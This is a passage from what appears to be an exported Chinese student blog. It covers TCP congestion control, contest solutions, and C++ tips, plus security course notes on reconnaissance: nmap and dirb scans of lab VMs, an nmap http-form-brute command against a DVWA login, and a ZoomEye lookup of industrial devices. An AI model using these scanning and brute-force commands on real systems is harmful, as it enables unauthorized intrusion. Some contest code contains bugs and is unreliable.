使用慢开始算法后，每经过一个传输轮次，拥塞窗口的cwnd就会加倍，即cwnd的大小呈指数型增长。这样慢开始一直吧拥塞窗口cwnd增大一个规定的慢开始门限ssthresh，然后采用拥塞避免算法。 （2）拥塞避免算法： 拥塞避免算法的做法是：发送端的拥塞窗口cwnd每经过一个往返时延RTT就增加一个MSS的大小，而不是加倍，使得cwnd按照线性的规律增长，而当复现一次超时时，则让慢开始门限ssthresh等于当前cwnd的一半。 快重传和快恢复是对慢开始和拥塞避免算法的改进 （1） 快重传 快速重传技术使用了冗余ACK来检测丢包的发生。同样，冗余ACK也用于网络拥塞的检测（丢了包当然意味着网络可能出现了拥塞）。1快重传并非取消重传计时器，而是在某些情况下可以更早地重传丢失的报文段。 当发送方连续收到三个重复的ACK报文时，直接重传对方尚未结果到的报文段，而不必等待那个报文段设置的重传计时器超时。 （2）快恢复 快恢复算法的原理：当发送端收到连续三个冗余ACK（即重复确认）时，就执行“乘法减小”算法，把慢开始门限sshresh设置为拥塞时发送方cwnd的一半。与慢开始不同之处是他爸cwnd的值设置为慢开始门限ssthresh改变后的数值，然后开始执行拥塞避免算法，使得拥塞窗口缓慢地线性增大。 例题：设TCP的拥塞窗口的慢开始门限值初始为8（单位为报文段），当拥塞窗口上升到12时发生超时，TCP开始慢启动和拥塞避免，那么第13次传输时拥塞窗口的大小为： 解：1 -&gt; 2 -&gt; 4 -&gt; 8 -&gt; 9 -&gt; 10 -&gt; 11 -&gt; 12 -&gt; 1 -&gt; 2 -&gt; 4 -&gt; 6 -&gt; 7 所以在第13次传输时拥塞窗口为7；","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"计算机网络","slug":"课程学习/计算机网络","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://blog.keter.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"「mist」配置mist论文环境","slug":"【mist】配置mist论文环境","date":"2021-05-10T06:01:02.000Z","updated":"2021-10-19T14:06:03.042Z","comments":true,"path":"2021/05/10/【mist】配置mist论文环境/","link":"","permalink":"http://blog.keter.top/2021/05/10/%E3%80%90mist%E3%80%91%E9%85%8D%E7%BD%AEmist%E8%AE%BA%E6%96%87%E7%8E%AF%E5%A2%83/","excerpt":"","text":"个人配置mistGPU论文训练环境的代码： 1234567891011121314cp /data/*.zip ./unzip env.zipmv torch-1.7.1+cu101-cp36-cp36m-linux_x86_64\\ .whl torch-1.7.1+cu101-cp36-cp36m-linux_x86_64.whlunzip detectron2.zipconda create -n &quot;corona2&quot; python=3.6conda install cudatoolkit=11.1pip3 install torch-1.7.1+cu101-cp36-cp36m-linux_x86_64.whlpip3 install torchvision-0.8.2+cu101-cp36-cp36m-linux_x86_64.whlpip3 install detectron2-0.3+cu101-cp36-cp36m-linux_x86_64.whlpip3 install opencv-pythoncd cocoapi/PythonAPIpython3 setup.py build_ext --inplace --userpython3 setup.py install --user cuda11.0的版本配置： 123456conda create -n &quot;corona2&quot; python=3.7conda install cudatoolkit=11.0pip3 install torch==1.7.0 torchvision==0.8.0 torchaudio==0.7.0python -m pip install detectron2 -f https://dl.fbaipublicfiles.com/detectron2/wheels/cu110/torch1.7/index.htmlpip3 install opencv-pythonpip install torch==1.7.0+cu110 torchvision==0.8.1+cu110 torchaudio===0.7.0 -f https://download.pytorch.org/whl/torch_stable.html","categories":[],"tags":[{"name":"mist","slug":"mist","permalink":"http://blog.keter.top/tags/mist/"}]},{"title":"「算法」第十二届蓝桥杯省赛第二场题解","slug":"【算法】第十二届蓝桥杯省赛第二场题解","date":"2021-05-10T06:01:02.000Z","updated":"2021-08-13T13:48:29.000Z","comments":true,"path":"2021/05/10/【算法】第十二届蓝桥杯省赛第二场题解/","link":"","permalink":"http://blog.keter.top/2021/05/10/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%9C%81%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BA%E9%A2%98%E8%A7%A3/","excerpt":"","text":"PDF 下载链接： ​ 第十二届蓝桥杯省赛第二场原题 ¶求余 提示： ​ 签到题不多说了 1234567#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; cout &lt;&lt; 2021%20; return 0;&#125; ans： 1 ¶双阶乘 提示： ​ 输出奇数位的乘积, 需要注意一下每次的运算都取下余数，只算最后几位。 考试的时候电脑上有python环境，我直接python解决 123456789101112#include &lt;iostream&gt;using namespace std;int main() &#123; long long res = 1; for (int i = 1; i &lt;= 2021; i += 2) &#123; res = res * i % 100000; &#125; cout &lt;&lt; res; return 0;&#125; ans：59375 ¶格点 提示： ​ 暴力一下就出来，花不了多少时间 12345678910111213141516#include &lt;iostream&gt;using namespace std;int main() &#123; long long x, y; int ans = 0; for (x = 1; x &lt;= 2021; x++) &#123; for (y = 1; y &lt;= 2021; y++) &#123; if (x * y &lt;= 2021)&#123; ans += 1; &#125; &#125; &#125; cout &lt;&lt; ans;&#125; ans：15698 ¶整数分解 提示： ​ 枚举前3个数，最后两个数只有m-1种情况, 注意一下int的数据范围问题 1234567891011121314151617#include &lt;iostream&gt;using namespace std;int main() &#123; long long ans = 0; for (int i = 1; i &lt; 2021; ++i) &#123; for (int j = 1; j &lt; 2021; ++j) &#123; for (int k = 1; k &lt; 2021; ++k) &#123; int m = 2021 - i - j - k; if (m &lt;= 1) break; ans += m - 1; &#125; &#125; &#125; cout &lt;&lt; ans;&#125; ans : 691677274345 ¶城邦 提示： ​ 最小生成树问题： 比赛的时候忘记Prim/Kruskal算法怎么写了，脑壳疼。这里我还是选择了Kruskal算法，因为比较好写，哈哈哈！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;typedef struct &#123; int begin; int end; int weight;&#125; Edge;int calculateWeight(int a, int b) &#123; int res = 0; string sa = to_string(a), sb = to_string(b); while (sa.size() &lt; sb.size()) sa = &quot;0&quot; + sa; // 因为 枚举时 a &lt;b 所以 只可能是a要补前导0 for (int i = 0; i &lt; sa.size(); ++i) &#123; if (sa[i] != sb[i]) res += sa[i] - &#x27;0&#x27; + sb[i] - &#x27;0&#x27;; &#125; return res;&#125;bool myCompare(Edge a, Edge b) &#123; return a.weight &lt; b.weight; // 升序排列&#125;int Find(const int *parent, int f) &#123; while (parent[f] &gt; 0) f = parent[f]; return f;&#125;int main() &#123; vector&lt;Edge&gt; M; // 构建边集数组 for (int i = 0; i &lt; 2021; ++i) &#123; for (int j = i + 1; j &lt; 2021; ++j) &#123; Edge edge; edge.begin = i; edge.end = j; edge.weight = calculateWeight(i + 1, j + 1); M.push_back(edge); &#125; &#125; sort(M.begin(), M.end(), myCompare); int maxVex = M.size(); int parent[maxVex]; for (int i = 0; i &lt; maxVex; ++i) &#123; parent[i] = 0; // 初始化数组值为0 &#125; long long res = 0; for (int i = 0; i &lt; maxVex; ++i) &#123; // 循环每一条边 int n = Find(parent, M[i].begin); int m = Find(parent, M[i].end); if (n != m) &#123; parent[n] = m; res += M[i].weight; &#125; &#125; cout &lt;&lt; res &lt;&lt; endl; return 0;&#125; ans：4046 ¶特殊年份 提示： ​ 读入之后判断一下即可； 1234567891011121314151617#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123; string a; int res = 0; for (int i = 0; i &lt; 5; ++i) &#123; cin &gt;&gt; a; if (a[0] == a[2] and a[3] - a[1] == 1) res += 1; &#125; cout &lt;&lt; res; return 0;&#125; ¶小平方 提示： ​ 直接暴力求解即可，但是需要注意进度问题，这里我乘以2取消了精度问题 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;string&gt;#include &lt;vector&gt;#define ll long longusing namespace std;int main() &#123; ll n; cin &gt;&gt; n; ll res; ll k; for (int i = 1; i &lt; n; ++i) &#123; k = (i * i) % n; k *= 2; // 乘以2取消精度问题 if (k &lt;= n)&#123; res += 1; &#125; &#125; cout &lt;&lt; res; return 0;&#125; ¶完全平方数 提示： ​ 用暴力的解法可以混一些分，正确的解法就比较麻烦。结合数论内容我们可以知道如果n是一个素数，那么x等于n直接输出即可。如果n 不是素数我们就做一个质因数分解，将分解得出的奇数次方的质数相乘就是我们要的结果。判断素数由于这里的数很大所以我们用欧几里得筛法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;map&gt;using namespace std;#define ll long longvector&lt;ll&gt; primes;map&lt;ll, int&gt; flag;bool isPrime(ll x) &#123; for (int i = 2; i * i &lt;= x; ++i) &#123; if (x % i == 0) &#123; return false; &#125; &#125; return true;&#125;void getPrime(ll x) &#123; ll j; vector&lt;bool&gt; vis(x, true); vis[0] = vis[1] = false; for (ll i = 2; i * i &lt; x; ++i) &#123; if (isPrime(i)) &#123; j = 2; while (j * i &lt;= x) &#123; vis[j * i] = false; j++; &#125; &#125; &#125; for (int i = 2; i &lt; vis.size(); ++i) &#123; if (vis[i]) primes.push_back(i); &#125;&#125;int main() &#123; ll x; cin &gt;&gt; x; if (isPrime(x)) &#123; cout &lt;&lt; x; &#125; else &#123; getPrime(x); ll i = primes.size() - 1; while (x != 1) &#123; while (i &gt;= 0) &#123; if (x % primes[(int) i] == 0) &#123; x = x / primes[i]; if (flag.find(primes[i]) == flag.end()) &#123; flag[primes[i]] = 1; &#125; else &#123; flag[primes[i]]++; &#125; break; &#125; else &#123; i--; &#125; &#125; &#125; ll ans = 1; for (auto it:flag) &#123; if (it.second % 2) ans *= it.first; &#125; cout &lt;&lt; ans; &#125; return 0;&#125; 剩下两题一道是模拟，一道不会… 【菜鸟的题解到这里就结束了】","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"「算法」竞赛中常用的c++黑魔法","slug":"【算法】竞赛中常用的c++黑魔法","date":"2021-05-08T06:01:02.000Z","updated":"2021-08-17T09:03:11.000Z","comments":true,"path":"2021/05/08/【算法】竞赛中常用的c++黑魔法/","link":"","permalink":"http://blog.keter.top/2021/05/08/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E7%AB%9E%E8%B5%9B%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84c++%E9%BB%91%E9%AD%94%E6%B3%95/","excerpt":"","text":"内容大部分查考therainisme的笔记本 🔗 这里是他的笔记本 ¶动态数组 vector 操作和Python的list类似 12345678vector&lt;int&gt; v; // 声明v.push_back(x); // 尾部添加一个元素v.pop_back(); // 删除尾部元素v.insert(v.begin()+2,2); // 在第二个元素后插入新元素v.back(); // 取出尾部的元素v.size(); // 返回vector的大小v.clear(); // 清空vector ¶栈 stack 123456stack&lt;int&gt; s;s.push(x); // 压入栈中元素int n = s.top(); // 返回栈顶元素int = s.size(); // 返回栈的大小s.pop(); // 弹出栈顶元素s.empty(); // 判断栈是否为空 ¶单向队列 queue 123456789int x=1;queue&lt;int&gt; q; // 声明q.push(x); // 推入队列中元素q.empty(); // 判断是否为空q.front(); // 取出对列首部的元素q.back(); // 取出队尾元素q.size(); // 返回队列长度q.pop(); // 弹出队首元素 ¶字符串 string 1234567891011121314151617string s = &quot;aabbcc&quot;;s.push_back(&#x27;a&#x27;); // 像尾部追加一个字符char c = s.back(); // 获取尾部的字符char c2= s.front(); // 获取头部的字符s.pop_back(); // 弹出尾部的字符// 字符串翻转reverse(s.begin(),s.end()); // 不需要重新赋值// 排序sort(s.begin(),s.end());// 插入元素s.insert(2,&quot;ahh&quot;); // 在第二个元素后插入// 删除元素s.erase(2, 3); // 从第二个元素开始删除后面的3个元素string d = s.substr(1,3); // 从索引为1的元素开始获取3个元素int a = s.find(&quot;aa&quot;); // 找到返回索引，找不到返回-1","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"「白帽子学习笔记」网络扫描与网络侦查","slug":"【白帽子学习笔记】网络扫描与网络侦查","date":"2021-05-03T06:01:02.000Z","updated":"2021-08-17T09:04:11.000Z","comments":true,"path":"2021/05/03/【白帽子学习笔记】网络扫描与网络侦查/","link":"","permalink":"http://blog.keter.top/2021/05/03/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E6%9F%A5/","excerpt":"[toc] ¶0x01网络扫描与网络侦查的目的 黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。","text":"[toc] ¶0x01网络扫描与网络侦查的目的 黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。 ¶0x02 常用工具介绍 ¶1x01 Google Hack Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。 我在以前写过一篇Goolge Hack基本语法的介绍博客。 链接如下：【白帽子学习笔记10】Google语法 ¶1x02 Nmap Nmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。 ¶1x03 Winhex WinHex 是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。 ¶1x04 Metasploit Metasploit是一个渗透测试框架，里面集合了很多的渗透测试功能。我关于Metasploit也写过一篇博客，链接如下： 白帽子学习笔记18】Metasploit学习笔记 ¶0x03 被动扫描 ¶1x01 麻省理工学院网站中文件名包含“network security”的pdf文档 首先我们先来构造一下谷歌语法： inurl:mit.edu intext:network security filetype:pdf inurl:mit.edu 表示搜索结果的url中包含mit.edu intext:network security 表示搜索的结果中包括network security filetype:pdf 表示搜索结果中的文件类型为pdf ¶1x02 照片信息解析 根据一张照片找出这个女孩在哪里旅行。 首先先看照片中的文字，然后可以看到一些文字，尝试将这些内容在Google 地图中进行搜索。 但是仔细一看发现不太对劲。这个图片不太一样啊。 最后尝试改变一下时间轴找到了在2015年时候的装潢是和图片中一样的。 这个是位置信息。 ¶1x03 手机位置定位 手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。 获取自己手机的LAC和CID： Android 获取方法：Android： 拨号*#*#4636#*#*进入手机信息工程模式后查看 iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest 但是请注意，这个操作在很多品牌的新版本中已经不能用了，比如华为和OPPO等。 ¶1x04 编码解码 将Z29vZCBnb29kIHN0dWR5IQ==解码 很明显的Base64解码 ¶1x05 地址信息 通过随便一个MAC地址查询网站就可以确定此MAC地址为苹果品牌 之后需要确定202.193.64.34到底是那个网页，发现直接访问不行。所以查询一下这个IP地址。 嗯于是就是猜测这个会不会不是桂电的官网呢？ 我们去ping一下桂电的官网，发现果然如此。 得出结论，这是一个苹果设备访问了桂电的主页。 首先我的IP地址是113.13.35.21 但是通过ifconfig查询到到本机ip地址为： 10.33.17.179 这两个都是我的IP地址，为什么会不一样呢？ 因为10.33.17.179是我的内网网址，而当我访问https://whatismyipaddress.com的时候，这个网址的主机是在外网的，我的数据包需要经过路由器将信息传输到外网当中，所以这个网页中获取的就是经过路由器转换后的外网地址。 ¶0x04 NMAP扫描Metasploitable2漏洞 ¶1x01 NMAP扫描Metasploitable2端口开放情况 首先我们需要两个虚拟机设备，并让两台设备置于同一网段 可以看到两者位于同一网段，我这里是两台设备同时设置在了虚拟机到Net模式下。 下面使用Nmap进行扫描。 可以看到开放了那么多的端口，不同的端口分别对于不同服务。 端口号 服务 ftp 远程文件传输 ssh 远程连接 telnet 远程登陆协议 smtp 提供可靠且有效的电子邮件传输协议 domain 将域名和IP地址相互映射 http 超文本传输协议 rpcbind rpcbind与BIND或实际上与任何DNS服务器非常相似。当使用将RPC接口的声明编译为服务器和客户端存根代码时，会选择或获得一个协议号rpcgen。 netbios-ssn 面向连接通信提供会话服务 microsoft-ds 远程登陆端口 exec exec函数族的函数执行成功后不会返回 login 登陆 shell Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务 rmiregistry 用于不同虚拟机之间的通信 ingreslock Ingreslock后门程序监听在1524端口，连接到1524端口就可以直接获得root权限 nfs 通过网络，让不同的机器、不同的操作系统可以共享彼此的文件 ccproxy-ftp 主要用于局域网内共享宽带上网，ADSL共享上网、专线代理共享、ISDN代理共享、卫星代理共享、蓝牙代理共享和二级代理等的文件传输 mysql 数据库 postgresql 关系数据库服务器 vnc 远程连接（有GUI图像界面） X11 X11也叫做X Window系统，X Window系统 (X11或X)是一种 位图 显示的 视窗系统 irc 一种网络聊天协议 ajp13 定向包协议 ¶1x02 NMAP扫描Metasploitable2操作系统类型 使用 nmap -O IP即可扫描操作系统信息。扫描结果如下图 ¶1x03 NMAP穷举Metasploitable2上DVWA的登陆账号和密码 通过扫描我们可以知道Metasploitable2开放了80的端口，DVWA是网页服务器而且上面也没有开启443端口所有就肯定在80端口了。 接下来选择nmap自带的http暴力破解工具 http-form-brute 选择路径为：/dvwa/login.php 组成的命令为： nmap -p 80 -script=http-form-brute -script-args=http-form-brute.path=/dvwa/login.php 10.34.80.4 ¶1x04 永恒之蓝-WannaCry蠕虫 WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件。蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。此病毒通过远程高危漏洞进行自我传播复制,并且加密文件采用了高强度的双RSA+AES加密,至少目前来说破解秘钥是不可能的,只能通过预防的方式来防御,勤打补丁,关闭445、139等端口,及时安装安全软件。 ¶0x05 ZoomEye搜索一个西门子工控设备 在ZoomEye中搜索西门子工控设备，点击一个可以看到该IP设备的如下信息 该设备开启了FTP端口可能会面临被不法分子获取FTP远程连接密码导致重要文件泄漏的问题，也开放了80和443端口说明可能有Web端，Web端的漏洞也可能导致系统遭到攻击。 ¶0x06 数据恢复与取证 ¶1x01 修复elephant.jpg 用16进制编辑器打开后可以发现文件头明显不符合JPG的格式。手动给改回来。 JPG文件头： FF D8 FF E0 成功修复 ¶1x02 笑脸后的阴霾 用16进制查看器拿到最后可以发现：tom is the killer. 太可怕了～～ ¶1x04 使用数据恢复软件恢复U盘文件 目前网络中的U盘数据工具很多，我使用了一个叫做嗨格式的U盘恢复软件，效果还挺不错的，操作也很简单。 ¶0x07 小结 通过对本篇博文的总结我们可以学习到如下内容： Google语法在信息搜索中的应用 图像信息提取能力 Nmap常用操作 Winhex等16进制软件的使用（文件修复，查看隐藏信息） 通过这些内容我们可以对网络扫描和网络侦查有一个很好的了解。","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"课程学习/网络渗透测试","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"网络渗透测试","permalink":"http://blog.keter.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"「白帽子学习笔记」CTF实践","slug":"【白帽子学习笔记】CTF实践","date":"2021-05-01T06:01:02.000Z","updated":"2021-08-17T09:03:59.000Z","comments":true,"path":"2021/05/01/【白帽子学习笔记】CTF实践/","link":"","permalink":"http://blog.keter.top/2021/05/01/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91CTF%E5%AE%9E%E8%B7%B5/","excerpt":"¶【白帽子学习笔记】CTF实践 ¶0x01 实验知识点 ¶1x01 什么是CTF？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 ¶1x02 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。","text":"¶【白帽子学习笔记】CTF实践 ¶0x01 实验知识点 ¶1x01 什么是CTF？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 ¶1x02 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。 1.2 CTF各大题型简介 ¶1x03 CTF各大题型简介 MISC（安全杂项） 全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。 PPC（编程类） 全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。 CRYPTO（密码学） 全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。 REVERSE（逆向） 题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。 STEGA（隐写） 全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。 PWN（溢出） PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。 WEB（web类） WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web*站开始的。 ¶0x02 获取Web Developer中的flag ¶1x01 Net Discover 首先通过namp扫描存活的主机，成功发现了Web Developer； ¶1x02 Nmap信息收集 接下来使用Nmap扫描Web Developer检查一下端口的开放情况； nmap 10.34.80.3 可以看到开放了80端口和22端口，这两个端口的作用分别是http端口（网页）和ssh端口（远程登陆）； ¶1x03 访问网站 因为网站开放了80端口，所以可以尝试登陆http端口 发现有一个搭建了一个个人模块网站，这个网站应该是一个比较经典的CMS了，记得我当初刚买服务器的时候@visualDust给我搭了这一个这个网站。 ¶1x04 whatweb探寻 通过whatweb进行检测可以发现该网站的如下信息： 从内容信息中可以得到，该网站的CMS为WordPress； ¶1x05 wpscan WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。 ¶1x06 Dirb爆破 使用dirb来爆破网站的根目录； dirb -u http://10.34.80.3 找到一个 http://10.34.80.3/ipdata/ 感觉这个很像流量信息，进去看一看吧 ¶1x07 wireshark数据分析 